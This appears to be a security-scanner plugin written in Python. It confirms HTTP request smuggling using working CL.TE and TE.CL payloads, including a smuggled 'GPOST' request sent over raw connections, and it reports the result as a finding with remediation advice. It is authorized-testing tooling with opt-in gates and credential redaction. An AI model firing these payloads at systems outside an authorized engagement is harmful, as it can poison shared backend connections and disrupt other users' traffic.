"""Fail-closed classic HTTP request-smuggling confirmation.

The tool intentionally supports only the deterministic CL.TE and TE.CL
``GPOST`` confirmation used by classic HTTP/1.1 desync checks.  It sends one
clean baseline request, one byte-exact attack request, and one normal follow-up
request.  When the front end explicitly replies ``Connection: close`` to the
attack, the follow-up uses one fresh client connection so the poisoned backend
connection can be reused by the proxy pool.  Timing alone is never accepted as
proof.  High-impact smuggling
chains (victim capture, cache attacks, H2 downgrade, CL.0, request splitting,
and pause-based desync) remain manual/approval-gated.

Runtime credentials are used only on the wire.  The result contains bounded,
redacted Request/Response transcripts that the backend validates before it
rebuilds a finding.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import ssl
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import SplitResult, urlsplit

from plugin_interface import ToolPlugin


ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
ALLOWED_VARIANTS = {"cl-te", "te-cl"}
PARSER_ERROR_STATUSES = {400, 403, 405, 501}
MAX_REQUEST_BYTES = 24_000
MAX_RESPONSE_BYTES = 64_000
MAX_HEADER_BYTES = 32_000
MAX_EVIDENCE_CHARS = 12_000
REDACTED_RUNTIME_SECRET = "<redacted-runtime-secret>"

_FORBIDDEN_CUSTOM_HEADERS = {
    "host",
    "content-length",
    "transfer-encoding",
    "connection",
    "proxy-connection",
    "upgrade",
}
_SENSITIVE_HEADER_LINE = re.compile(
    r"(?im)^(?:authorization|cookie|set-cookie|proxy-authorization|x-csrf-token)\s*:.*$"
)
_SENSITIVE_JSON_VALUE = re.compile(
    r'(?P<prefix>"[^"\r\n]*(?:csrf|token|session|cookie|authorization|password|secret|api[_-]?key)[^"\r\n]*"\s*:\s*)'
    r'(?P<value>"(?:\\.|[^"\\])*"|[^,}\]\r\n]+)',
    re.I,
)
_GPOST_MARKER = re.compile(r"(?:unrecognized\s+method[^\r\n<]{0,80})?\bGPOST\b", re.I)


def _http_url(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        return None
    if parsed.username or parsed.password or parsed.fragment:
        return None
    if len(raw) > 4_096:
        return None
    return raw


def _validate_headers(value: Any) -> Tuple[bool, str]:
    if value is None:
        return True, ""
    if not isinstance(value, dict):
        return False, "headers and authHeaders must be objects"
    if len(value) > 24:
        return False, "too many custom headers"
    for key, header_value in value.items():
        name = str(key or "").strip()
        text = str(header_value or "")
        if not name or len(name) > 128 or len(text) > 4_096:
            return False, "custom header name or value is outside the bounded contract"
        if not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", name):
            return False, "custom header name is invalid"
        if "\r" in text or "\n" in text or "\0" in text:
            return False, "custom header values must not contain control characters"
        if name.lower() in _FORBIDDEN_CUSTOM_HEADERS:
            return False, f"custom {name} is controlled by the probe"
    return True, ""


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    target = _http_url(parameters.get("target") or parameters.get("endpoint") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) URL without a fragment"

    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    variant = str(parameters.get("variant") or "").lower()
    if variant not in ALLOWED_VARIANTS:
        return False, "variant must be cl-te or te-cl"

    try:
        timeout = int(parameters.get("timeoutSeconds") or 12)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"

    for source in (parameters.get("headers"), parameters.get("authHeaders")):
        valid, reason = _validate_headers(source)
        if not valid:
            return valid, reason
    cookie = parameters.get("authCookies") or parameters.get("cookie")
    if cookie is not None and (len(str(cookie)) > 8_192 or "\r" in str(cookie) or "\n" in str(cookie)):
        return False, "cookie material is outside the bounded contract"
    return True, ""


def _target_parts(target: str) -> Tuple[SplitResult, str, int, str, str]:
    parsed = urlsplit(target)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    request_target = parsed.path or "/"
    if parsed.query:
        request_target += f"?{parsed.query}"
    default_port = 443 if parsed.scheme == "https" else 80
    display_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
    host_header = display_host if port == default_port else f"{display_host}:{port}"
    return parsed, host, port, request_target, host_header


def _extra_header_lines(parameters: Dict[str, Any]) -> Tuple[List[str], List[str]]:
    lines: List[str] = []
    secrets: List[str] = []
    seen = set()
    for source_name in ("authHeaders", "headers"):
        source = parameters.get(source_name)
        if not isinstance(source, dict):
            continue
        for key, value in source.items():
            name = str(key).strip()
            lower = name.lower()
            if lower in seen or lower in _FORBIDDEN_CUSTOM_HEADERS:
                continue
            seen.add(lower)
            text = str(value)
            lines.append(f"{name}: {text}")
            if lower in {"authorization", "proxy-authorization", "x-csrf-token"}:
                secrets.append(text)
    cookie = parameters.get("authCookies") or parameters.get("cookie")
    if cookie:
        text = str(cookie)
        lines.append(f"Cookie: {text}")
        secrets.append(text)
    return lines, secrets


def _build_request(
    request_target: str,
    host_header: str,
    connection: str,
    extra_headers: Iterable[str],
) -> bytes:
    lines = [
        f"POST {request_target} HTTP/1.1",
        f"Host: {host_header}",
        "User-Agent: xASM-Agentic-Smuggling-Probe/1.0",
        "Accept: */*",
        "Content-Length: 0",
        f"Connection: {connection}",
        *extra_headers,
    ]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")


def build_cl_te_attack(
    request_target: str,
    host_header: str,
    extra_headers: Iterable[str] = (),
) -> bytes:
    body = b"0\r\n\r\nG"
    lines = [
        f"POST {request_target} HTTP/1.1",
        f"Host: {host_header}",
        "User-Agent: xASM-Agentic-Smuggling-Probe/1.0",
        "Accept: */*",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(body)}",
        "Transfer-Encoding: chunked",
        "Connection: keep-alive",
        *extra_headers,
    ]
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8") + body
    if len(body) != 6 or len(request) > MAX_REQUEST_BYTES:
        raise ValueError("CL.TE request framing is outside the bounded contract")
    return request


def build_te_cl_attack(
    request_target: str,
    host_header: str,
    extra_headers: Iterable[str] = (),
) -> bytes:
    smuggled = (
        f"GPOST {request_target} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n\r\n"
        "x=1"
    ).encode("utf-8")
    size_line = f"{len(smuggled):x}".encode("ascii")
    body = size_line + b"\r\n" + smuggled + b"\r\n0\r\n\r\n"
    outer_content_length = len(size_line) + 2
    lines = [
        f"POST {request_target} HTTP/1.1",
        f"Host: {host_header}",
        "User-Agent: xASM-Agentic-Smuggling-Probe/1.0",
        "Accept: */*",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {outer_content_length}",
        "Transfer-Encoding: chunked",
        "Connection: keep-alive",
        *extra_headers,
    ]
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8") + body
    if int(size_line, 16) != len(smuggled) or len(request) > MAX_REQUEST_BYTES:
        raise ValueError("TE.CL request framing is outside the bounded contract")
    return request


async def _readline(reader: asyncio.StreamReader, timeout: int) -> bytes:
    line = await asyncio.wait_for(reader.readline(), timeout=timeout)
    if not line:
        raise ValueError("connection closed before the HTTP response completed")
    if len(line) > MAX_HEADER_BYTES:
        raise ValueError("HTTP response header line exceeded the bounded limit")
    return line


async def _read_chunked_body(
    reader: asyncio.StreamReader,
    timeout: int,
) -> Tuple[bytes, bytes]:
    wire = bytearray()
    decoded = bytearray()
    while True:
        size_line = await _readline(reader, timeout)
        wire.extend(size_line)
        try:
            size = int(size_line.split(b";", 1)[0].strip(), 16)
        except ValueError as exc:
            raise ValueError("invalid chunk size in HTTP response") from exc
        if size < 0 or len(decoded) + size > MAX_RESPONSE_BYTES:
            raise ValueError("HTTP response body exceeded the bounded limit")
        if size == 0:
            while True:
                trailer = await _readline(reader, timeout)
                wire.extend(trailer)
                if trailer in {b"\r\n", b"\n"}:
                    return bytes(wire), bytes(decoded)
        chunk = await asyncio.wait_for(reader.readexactly(size + 2), timeout=timeout)
        if not chunk.endswith(b"\r\n"):
            raise ValueError("invalid chunk terminator in HTTP response")
        wire.extend(chunk)
        decoded.extend(chunk[:-2])


async def read_http_response(reader: asyncio.StreamReader, timeout: int) -> Dict[str, Any]:
    while True:
        try:
            header_blob = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=timeout)
        except asyncio.LimitOverrunError as exc:
            raise ValueError("HTTP response headers exceeded the bounded limit") from exc
        except asyncio.IncompleteReadError as exc:
            raise ValueError("connection closed before HTTP response headers completed") from exc
        if len(header_blob) > MAX_HEADER_BYTES:
            raise ValueError("HTTP response headers exceeded the bounded limit")

        header_text = header_blob.decode("iso-8859-1", errors="replace")
        lines = header_text[:-4].split("\r\n")
        status_match = re.fullmatch(r"HTTP/(\d(?:\.\d)?)\s+(\d{3})(?:\s+(.*))?", lines[0])
        if not status_match:
            raise ValueError("invalid HTTP response status line")
        status = int(status_match.group(2))
        headers: List[Tuple[str, str]] = []
        for line in lines[1:]:
            if ":" not in line:
                raise ValueError("invalid HTTP response header")
            name, value = line.split(":", 1)
            headers.append((name.strip(), value.strip()))

        header_map: Dict[str, str] = {}
        for name, value in headers:
            header_map[name.lower()] = value
        if 100 <= status < 200 and status != 101:
            continue

        raw_body = b""
        decoded_body = b""
        transfer_encoding = header_map.get("transfer-encoding", "").lower()
        if "chunked" in transfer_encoding:
            raw_body, decoded_body = await _read_chunked_body(reader, timeout)
        elif "content-length" in header_map:
            try:
                content_length = int(header_map["content-length"])
            except ValueError as exc:
                raise ValueError("invalid HTTP response Content-Length") from exc
            if content_length < 0 or content_length > MAX_RESPONSE_BYTES:
                raise ValueError("HTTP response body exceeded the bounded limit")
            decoded_body = await asyncio.wait_for(
                reader.readexactly(content_length), timeout=timeout
            )
            raw_body = decoded_body
        elif header_map.get("connection", "").lower() == "close":
            raw_body = await asyncio.wait_for(reader.read(MAX_RESPONSE_BYTES + 1), timeout=timeout)
            if len(raw_body) > MAX_RESPONSE_BYTES:
                raise ValueError("HTTP response body exceeded the bounded limit")
            decoded_body = raw_body
        else:
            raise ValueError("HTTP response has no bounded body framing")

        return {
            "status": status,
            "statusLine": lines[0],
            "headers": headers,
            "headerText": header_text[:-4],
            "bodyBytes": decoded_body,
            "rawBodyBytes": raw_body,
            "body": decoded_body.decode("utf-8", errors="replace").replace("\0", ""),
        }


def sanitize_evidence_text(
    value: Any,
    secret_values: Iterable[Any] = (),
    max_chars: int = MAX_EVIDENCE_CHARS,
) -> str:
    sanitized = str(value or "").replace("\0", "")
    secrets = sorted(
        {str(secret) for secret in secret_values if secret is not None and len(str(secret)) >= 3},
        key=len,
        reverse=True,
    )
    for secret in secrets:
        sanitized = sanitized.replace(secret, REDACTED_RUNTIME_SECRET)
    sanitized = _SENSITIVE_HEADER_LINE.sub(
        lambda match: f"{match.group(0).split(':', 1)[0]}: {REDACTED_RUNTIME_SECRET}",
        sanitized,
    )
    sanitized = _SENSITIVE_JSON_VALUE.sub(
        lambda match: f'{match.group("prefix")}"{REDACTED_RUNTIME_SECRET}"',
        sanitized,
    )
    if len(sanitized) > max_chars:
        return sanitized[:max_chars] + "\n...[evidence excerpt truncated]"
    return sanitized


def build_http_evidence_step(
    label: str,
    raw_request: bytes,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> Dict[str, Any]:
    request_text = raw_request.decode("iso-8859-1", errors="replace")
    response_body = bytes(response.get("bodyBytes") or b"")
    response_text = f"{response.get('headerText') or ''}\r\n\r\n{response.get('body') or ''}"
    return {
        "label": label,
        "request": sanitize_evidence_text(request_text, secret_values, MAX_REQUEST_BYTES + 512),
        "requestSha256": hashlib.sha256(raw_request).hexdigest(),
        "response": sanitize_evidence_text(response_text, secret_values),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body),
        "responseBodySha256": hashlib.sha256(response_body).hexdigest(),
        "responseExcerptTruncated": len(response_text) > MAX_EVIDENCE_CHARS,
    }


def verify_gpost_signal(
    baseline: Dict[str, Any],
    attack: Dict[str, Any],
    follow_up: Dict[str, Any],
) -> Dict[str, Any]:
    baseline_text = f"{baseline.get('headerText', '')}\n{baseline.get('body', '')}"
    attack_text = f"{attack.get('headerText', '')}\n{attack.get('body', '')}"
    follow_up_text = f"{follow_up.get('headerText', '')}\n{follow_up.get('body', '')}"
    baseline_status = int(baseline.get("status") or 0)
    attack_status = int(attack.get("status") or 0)
    follow_up_status = int(follow_up.get("status") or 0)
    marker = _GPOST_MARKER.search(follow_up_text)
    verified = (
        200 <= baseline_status < 400
        and _GPOST_MARKER.search(baseline_text) is None
        and follow_up_status in PARSER_ERROR_STATUSES
        and marker is not None
    )
    return {
        "verified": verified,
        "baselineStatus": baseline_status,
        "attackStatus": attack_status,
        "followUpStatus": follow_up_status,
        "marker": "GPOST" if marker else None,
        "markerAbsentFromBaseline": _GPOST_MARKER.search(baseline_text) is None,
        "markerObservedInAttack": _GPOST_MARKER.search(attack_text) is not None,
        "proofSignal": "gpost-parser-error" if verified else None,
    }


def response_declares_connection_close(response: Dict[str, Any]) -> bool:
    for name, value in response.get("headers") or []:
        if str(name).lower() != "connection":
            continue
        tokens = {token.strip().lower() for token in str(value).split(",")}
        if "close" in tokens:
            return True
    return False


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    variant = str(verification.get("variant") or "classic")
    return {
        "template-id": "xasm-http-request-smuggling-verified",
        "matcher-name": f"request-smuggling-{variant}",
        "type": "http",
        "host": target,
        "matched-at": target,
        "info": {
            "name": f"Verified HTTP Request Smuggling ({variant.upper()})",
            "severity": "high",
            "description": (
                "A byte-exact conflicting-framing request changed the next normal "
                "request into the deterministic GPOST parser error while a clean "
                "baseline remained unaffected."
            ),
            "remediation": (
                "Use HTTP/2 end-to-end where possible. Reject ambiguous Content-Length/"
                "Transfer-Encoding requests, normalize framing consistently at every hop, "
                "and close backend connections after parser errors."
            ),
            "classification": {"cwe-id": ["CWE-444"]},
        },
        "evidence": verification,
    }


class RequestSmugglingProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:request_smuggling_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms classic HTTP/1.1 CL.TE or TE.CL request smuggling on one exact "
            "authorized endpoint using a clean baseline plus a deterministic GPOST "
            "follow-up parser error. Requires aggressive/lab/ctf opt-in, sends exactly "
            "three requests, and emits sanitized Request/Response evidence."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Exact HTTP(S) endpoint"},
                "endpoint": {"type": "string", "description": "Alias for target"},
                "url": {"type": "string", "description": "Alias for target"},
                "variant": {"type": "string", "enum": sorted(ALLOWED_VARIANTS)},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "headers": {"type": "object"},
                "authCookies": {"type": "string", "x-hidden": True},
                "cookie": {"type": "string", "x-hidden": True},
                "authHeaders": {"type": "object", "x-hidden": True},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30, "default": 12},
            },
            "required": ["variant", "engagement", "allowUnsafeMethods"],
            "oneOf": [
                {"required": ["target"]},
                {"required": ["endpoint"]},
                {"required": ["url"]},
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings", "request_smuggling_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm classic HTTP request smuggling with a GPOST response delta",
            "secondary_purposes": [],
        }

    async def _open(self, target: str, timeout: int) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        parsed, host, port, _request_target, _host_header = _target_parts(target)
        ssl_context: Optional[ssl.SSLContext] = None
        server_hostname: Optional[str] = None
        if parsed.scheme == "https":
            ssl_context = ssl.create_default_context()
            ssl_context.set_alpn_protocols(["http/1.1"])
            server_hostname = host
        return await asyncio.wait_for(
            asyncio.open_connection(
                host,
                port,
                ssl=ssl_context,
                server_hostname=server_hostname,
                ssl_handshake_timeout=timeout if ssl_context else None,
            ),
            timeout=timeout,
        )

    @staticmethod
    async def _close(writer: asyncio.StreamWriter) -> None:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = str(parameters.get("target") or parameters.get("endpoint") or parameters.get("url"))
        variant = str(parameters.get("variant") or "").lower()
        engagement = str(parameters.get("engagement") or "").lower()
        timeout = int(parameters.get("timeoutSeconds") or 12)
        _parsed, _host, _port, request_target, host_header = _target_parts(target)
        extra_headers, secret_values = _extra_header_lines(parameters)
        baseline_request = _build_request(request_target, host_header, "close", extra_headers)
        follow_up_request = _build_request(request_target, host_header, "close", extra_headers)
        attack_request = (
            build_cl_te_attack(request_target, host_header, extra_headers)
            if variant == "cl-te"
            else build_te_cl_attack(request_target, host_header, extra_headers)
        )

        request_count = 0
        baseline_response: Optional[Dict[str, Any]] = None
        attack_response: Optional[Dict[str, Any]] = None
        follow_up_response: Optional[Dict[str, Any]] = None
        follow_up_connection = "same-client-connection"
        baseline_writer: Optional[asyncio.StreamWriter] = None
        attack_writer: Optional[asyncio.StreamWriter] = None
        try:
            baseline_reader, baseline_writer = await self._open(target, timeout)
            baseline_writer.write(baseline_request)
            await baseline_writer.drain()
            request_count += 1
            baseline_response = await read_http_response(baseline_reader, timeout)
            await self._close(baseline_writer)
            baseline_writer = None

            attack_reader, attack_writer = await self._open(target, timeout)
            attack_writer.write(attack_request)
            await attack_writer.drain()
            request_count += 1
            attack_response = await read_http_response(attack_reader, timeout)

            follow_up_reader = attack_reader
            if response_declares_connection_close(attack_response):
                await self._close(attack_writer)
                attack_writer = None
                follow_up_reader, attack_writer = await self._open(target, timeout)
                follow_up_connection = "new-client-connection-after-front-end-close"

            attack_writer.write(follow_up_request)
            await attack_writer.drain()
            request_count += 1
            follow_up_response = await read_http_response(follow_up_reader, timeout)
            await self._close(attack_writer)
            attack_writer = None
        except Exception as exc:
            if baseline_writer is not None:
                await self._close(baseline_writer)
            if attack_writer is not None:
                await self._close(attack_writer)
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": request_count,
                "findings": [],
            }

        assert baseline_response is not None
        assert attack_response is not None
        assert follow_up_response is not None
        signal = verify_gpost_signal(baseline_response, attack_response, follow_up_response)
        http_evidence = {
            "version": 1,
            "steps": [
                build_http_evidence_step(
                    "clean-baseline", baseline_request, baseline_response, secret_values
                ),
                build_http_evidence_step(
                    "smuggling-attack", attack_request, attack_response, secret_values
                ),
                build_http_evidence_step(
                    "verification-follow-up", follow_up_request, follow_up_response, secret_values
                ),
            ],
        }
        verification = {
            "verified": signal["verified"] is True,
            "fallback": False,
            "mode": "classic-http1",
            "target": target,
            "variant": variant,
            "engagement": engagement,
            "requestCount": request_count,
            "authenticated": bool(secret_values),
            "followUpConnection": follow_up_connection,
            "httpEvidence": http_evidence,
            **signal,
        }
        findings = [build_nuclei_finding(target, verification)] if verification["verified"] else []
        return {
            "success": verification["verified"],
            "fallback": False,
            "target": target,
            "verification": verification,
            "findings": findings,
            "summary": {
                "verified": verification["verified"],
                "variant": variant,
                "proofSignal": verification.get("proofSignal"),
                "requestCount": request_count,
                "findingCount": len(findings),
            },
        }


def get_tool() -> RequestSmugglingProbeTool:
    return RequestSmugglingProbeTool()
